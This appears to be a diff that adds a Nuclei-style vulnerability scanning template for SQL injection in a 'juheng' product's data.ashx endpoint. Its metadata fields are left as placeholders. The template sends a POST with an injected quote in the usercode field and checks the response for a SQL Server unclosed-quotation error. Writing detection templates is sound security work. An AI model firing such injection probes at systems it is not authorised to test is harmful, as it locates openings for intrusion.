@@ -1,0 +1,23 @@
+id: juheng-data-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 23
+
+        usercode=admin'&mobile=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '后的引号不完整'
